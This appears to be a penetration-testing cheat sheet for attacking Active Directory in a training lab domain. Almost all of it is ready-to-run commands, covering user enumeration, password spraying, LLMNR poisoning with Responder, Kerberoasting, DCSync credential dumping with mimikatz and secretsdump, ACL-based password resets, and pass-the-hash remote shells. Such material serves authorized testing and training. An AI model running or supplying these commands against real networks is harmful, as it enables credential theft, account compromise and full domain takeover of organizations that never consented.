
# Active Directory Penetration Testing Cheat Sheet

This guide provides a structured overview of commands used during an Active Directory penetration test, from initial reconnaissance to gaining privileged access.

---

##  Reconnaissance (OSINT)

This phase involves gathering information from publicly available sources to understand the target's structure without directly interacting with their systems.

### `viewdns.info`
* **Purpose:** A web-based tool for performing DNS lookups, reverse IP lookups, and discovering domain information.
* **Look for:** Subdomains, IP ranges, mail server (MX) records, and nameserver (NS) records.

### `nslookup`
* **Purpose:** Queries DNS servers to find domain names or IP address mappings.
* **Look for:** IP addresses of key servers like Domain Controllers (`_ldap._tcp.dc._msdcs.<DOMAIN>`), nameservers, and mail servers.
```shell
nslookup ns1.inlanefreight.com
````

### `linkedin2username`

  * **Purpose:** Generates username lists from LinkedIn employee data, which can be used for password spraying.
  * **Look for:** Potential username formats (e.g., `f.last`, `flast`, `first.last`).

### Google Dorking

  * **Purpose:** Uses advanced Google search operators to find sensitive information indexed by search engines.
  * **Look for:** Exposed documents, internal paths, error messages, and email addresses.

<!-- end list -->

```shell
# Find PDF files on the target domain
filetype:pdf inurl:inlanefreight.com

# Find email addresses on the target domain
intext:"@inlanefreight.com" inurl:inlanefreight.com
```

### `dehashed.py`

  * **Purpose:** A script to query the Dehashed API for credentials exposed in data breaches.
  * **Look for:** Leaked usernames, email addresses, and passwords associated with the domain.

<!-- end list -->

```shell
sudo python3 dehashed.py -q inlanefreight.local -p
```

-----

## Initial Enumeration & Network Scanning

This phase focuses on actively scanning the internal network to identify live hosts, open ports, and running services.

### Network Sniffing

  * **Purpose:** To capture and analyze network traffic. This can reveal host communications, protocols in use, and sometimes credentials.
  * **Look for:** LLMNR/NBT-NS traffic, broadcast requests, ARP traffic revealing hosts, and cleartext credentials.

<!-- end list -->

```shell
# GUI-based traffic analysis
sudo -E wireshark

# Command-line traffic capture
sudo tcpdump -i ens224
```

### Host Discovery

  * **Purpose:** To identify live hosts on the network segment.
  * **Look for:** A list of responsive IP addresses to target for deeper scanning.

<!-- end list -->

```shell
# Fast ping sweep to find live hosts
fping -asgq 172.16.5.0/23
```

### Port Scanning with Nmap

  * **Purpose:** To discover open ports, services, OS versions, and run scripts to find vulnerabilities on target hosts.
  * **Look for:** Common AD ports (88, 135, 139, 389, 445, 636, 3268, 3269, 5985, 5986), service versions, and OS information.

<!-- end list -->

```shell
# Aggressive scan on a single host
nmap -A 172.16.5.100

# Aggressive, fast scan on a subnet, outputting in Grepable format
sudo nmap -A -Pn -T5 -oG ./nmapOutput 172.16.5.0/23
```

-----

## User Enumeration & Brute-Forcing

Once a Domain Controller is identified, the next step is to find valid usernames to target.

### Kerbrute Setup

  * **Purpose:** A tool for efficiently brute-forcing and enumerating valid Active Directory accounts through Kerberos pre-authentication.

<!-- end list -->

```shell
# Clone the repository
sudo git clone [https://github.com/ropnop/kerbrute.git](https://github.com/ropnop/kerbrute.git)

# Build the tool
sudo make all

# Move the binary to your PATH for easy access
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

### Kerbrute User Enumeration

  * **Purpose:** To validate a list of potential usernames against the Domain Controller without causing account lockouts.
  * **Look for:** `VALID USERNAME` entries in the output, confirming the existence of the account.

<!-- end list -->

```shell
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 users.txt -o valid_ad_users
```

### Other User Enumeration Techniques

  * **Purpose:** Using different protocols and tools to enumerate domain users.
  * **Look for:** Lists of usernames.

<!-- end list -->

```shell
# Enumerate users via RPC (as null user)
rpcclient -U "" -N 172.16.5.5
 > enumdomusers

# Enumerate users via LDAP (as null user)
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" "(&(objectClass=user))" | grep sAMAccountName:

# Use CrackMapExec to dump users
crackmapexec smb 172.16.5.5 --users
```

-----

## LLMNR/NBT-NS Poisoning

This attack intercepts name resolution requests on a local network to capture credentials. It works when a user tries to access a share that doesn't exist (e.g., `\\fileshare`).

### Capturing Hashes (Linux)

  * **Purpose:** Use Responder to poison LLMNR/NBT-NS requests and capture NTLMv2 hashes.
  * **Look for:** Captured hashes in the Responder output.

<!-- end list -->

```shell
# Start Responder to listen for requests
sudo responder -I ens224

# Crack the captured hash with Hashcat
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

### Capturing Hashes (Windows)

  * **Purpose:** Use Inveigh (a PowerShell tool) to perform the same poisoning attack from a Windows host.
  * **Look for:** Captured hashes in the Inveigh console output.

<!-- end list -->

```shell
# Import the Inveigh module
Import-Module .\Inveigh.ps1

# Start the listener
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```

-----

## Password Spraying

This technique involves trying a small number of common passwords (e.g., `Password123`, `Fall2025`) against a large list of usernames to avoid account lockouts.

### Password Spraying (Linux)

  * **Purpose:** To identify users with weak, common passwords.
  * **Look for:** Successful authentication messages or positive results (`+` in CME).

<!-- end list -->

```shell
# Using Kerbrute
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1

# Using CrackMapExec
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep '+'
```

### Password Spraying (Windows)

  * **Purpose:** Perform the attack using a PowerShell-based tool.
  * **Look for:** Successful logins written to the output file.

<!-- end list -->

```shell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

-----

## Credentialed Enumeration

Once you have valid credentials, you can perform a much deeper enumeration of the domain.

### Enumeration with CrackMapExec (Linux)

  * **Purpose:** To quickly gather information about users, groups, shares, and logged-on users across the network.
  * **Look for:** Domain Admins, sensitive groups, accessible shares with interesting files, and sessions of high-privilege users.

<!-- end list -->

```shell
# Enumerate domain users with credentials
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

# Enumerate domain groups
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# Find logged on users on a specific machine
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

# Enumerate and spider a file share
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

### BloodHound Data Collection

  * **Purpose:** Collects detailed information about AD objects (users, groups, computers, ACLs) to find attack paths.
  * **Look for:** The generated JSON files, which can be imported into the BloodHound GUI to visualize privilege escalation paths.

<!-- end list -->

```shell
# From Linux
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all

# From Windows
.\SharpHound.exe -c All --zipfilename ILFREIGHT.zip
```

### Enumeration with PowerShell (Windows)

  * **Purpose:** To use native AD modules or tools like PowerView for deep domain enumeration.
  * **Look for:** Domain policy, trusts, user/group details, and Service Principal Names (SPNs).

<!-- end list -->

```shell
# Import the AD module (requires RSAT)
Import-Module ActiveDirectory

# Get domain information
Get-ADDomain

# Get details for a specific user
Get-ADUser -Identity someuser -Properties *

# Find all users with an SPN set (potential Kerberoasting targets)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Using PowerView
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

-----

## Kerberoasting

This attack targets user accounts that are associated with a Service Principal Name (SPN). We can request a Kerberos ticket (TGS) for that service, and since the ticket is encrypted with the service account's NTLM hash, we can crack it offline.

### Kerberoasting (Linux)

  * **Purpose:** Use Impacket's `GetUserSPNs.py` to request service tickets and save them for cracking.
  * **Look for:** TGS hashes that can be cracked offline.

<!-- end list -->

```shell
# Request a TGS for a specific user and save it to a file
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

# Crack the hash with Hashcat (mode 13100 for Kerberos 5 TGS-REP)
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

### Kerberoasting (Windows)

  * **Purpose:** Use tools like Rubeus or PowerView to request and extract TGS tickets.
  * **Look for:** Hashcat-formatted TGS hashes.

<!-- end list -->

```shell
# Using Rubeus to find and roast all kerberoastable accounts
.\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# Using PowerView to get a hash for a specific user
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

-----

## Post-Exploitation & Living Off The Land

Commands to run after gaining initial access to a Windows host to understand the environment and find privilege escalation opportunities.

### System Enumeration

  * **Purpose:** To gather information about the local system configuration.
  * **Look for:** Antivirus status, PowerShell version, firewall rules, and network configuration.

<!-- end list -->

```powershell
# Check AV status
Get-MpComputerStatus

# Check PowerShell language mode (Constrained is bad for us)
$ExecutionContext.SessionState.LanguageMode

# List firewall rules
netsh advfirewall show allprofiles

# See who else is logged on
qwinsta

# View network connections and routes
arp -a
route print
```

### Domain Enumeration (Native Tools)

  * **Purpose:** To query Active Directory using built-in Windows commands.
  * **Look for:** Domain groups, user details, and domain controller information.

<!-- end list -->

```powershell
# List domain groups
net group /domain

# Get info about a specific domain user
net user wrouse /domain

# List local administrators on the current machine
net localgroup Administrators

# Query for domain users and computers using dsquery
dsquery user
dsquery computer
```

-----

## Privilege Escalation & Persistence

Techniques to elevate privileges to Domain Admin and maintain access.

### Abusing ACLs

  * **Purpose:** To find and exploit misconfigured Access Control Lists on AD objects that allow a lower-privileged user to gain higher privileges (e.g., reset a password of another user).
  * **Look for:** Permissions like `GenericAll`, `GenericWrite`, `WriteDACL`, or `WriteOwner` over privileged user or group objects.

<!-- end list -->

```powershell
# Using PowerView to find interesting ACLs
Find-InterestingDomainAcl

# Use a compromised user's rights to reset another user's password
Set-DomainUserPassword -Identity damundsen -AccountPassword 'Pwn3d_by_ACLs!' -Credential $Cred
```

### DCSync Attack

  * **Purpose:** An attack where a user with specific replication privileges (`GetChanges` and `GetChangesAll`) can impersonate a Domain Controller and request password hashes from another DC.
  * **Look for:** A user with these specific extended rights on the domain object.

<!-- end list -->

```powershell
# Find users with DCSync rights
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')}

# Execute DCSync with secretsdump.py
secretsdump.py -just-dc INLANEFREIGHT/adunn@172.16.5.5

# Execute DCSync with mimikatz
mimikatz.exe "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:administrator" "exit"
```

### Privileged Access (Pass-the-Hash)

  * **Purpose:** Once you have NTLM hashes (e.g., from DCSync), you can use them to authenticate to other systems without needing the plaintext password.
  * **Look for:** Successful authentication and shell access (`(Pwn3d!)` in CME).

<!-- end list -->

```shell
# Using CrackMapExec with a hash
sudo crackmapexec smb 172.16.5.0/23 -u administrator -H <NTLM_HASH>

# Using psexec.py from Impacket for remote shell
psexec.py -hashes :<NTLM_HASH> INLANEFREIGHT/administrator@172.16.5.5

# Using wmiexec.py for a semi-interactive shell
wmiexec.py -hashes :<NTLM_HASH> INLANEFREIGHT/administrator@172.16.5.5
```

```
